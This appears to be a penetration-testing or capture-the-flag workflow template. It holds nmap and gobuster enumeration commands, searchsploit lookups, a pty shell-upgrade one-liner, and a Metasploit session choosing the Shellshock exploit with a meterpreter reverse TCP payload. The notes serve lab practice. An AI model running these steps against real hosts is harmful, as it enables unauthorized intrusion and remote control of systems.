# tempalte, flow

## Summary

+ example

## prev enum

```sh
sudo nmap -sS -sC -sV -oA ./nmap/full_sS -O -p- 192.168.0.1
  # rename-tab
sudo vim /etc/hosts
```

## gobuster

```sh
dict="/usr/share/wordlists/dirb/common.txt"
ls -lah $dict                                    # 36KB
gobuster dir -u http://example/ -w $dict -t 20 -e -x php,asp,json,aspx
  # 5min
  # find /cgi-bin/ (status 403)

gobuster dir -u http://example/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -t 20 -e -x cgi,sh,pl,py,rb,php
  # 5min
  # find /user.sh (status 200)
```

## searchsploit

```sh
search keywords
searchsploit keywords
```

```sh
cdee
cp /usr/share/exploitdb/exploits/example ~/assets/example/temp.php
cda
```

## example-vector

## interactive shell

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
  # C-z to background the shell
stty raw -echo; fg
```

## post enum

```sh
ps aux
sudo -l
```

## privilege escalation

```sh
```

## msf

```msfconsole
msf> search example
  # 2  exploit/multi/http/apache_mod_cgi_bash_env_exec      2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
msf> use 2
msf> show advanced
msf> show options
msf> set RHOSTS example
msf> ...

msf> show payloads
  # 14 payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
msf> set payload 14

msf> run -j
  # meterpreter user shell
```
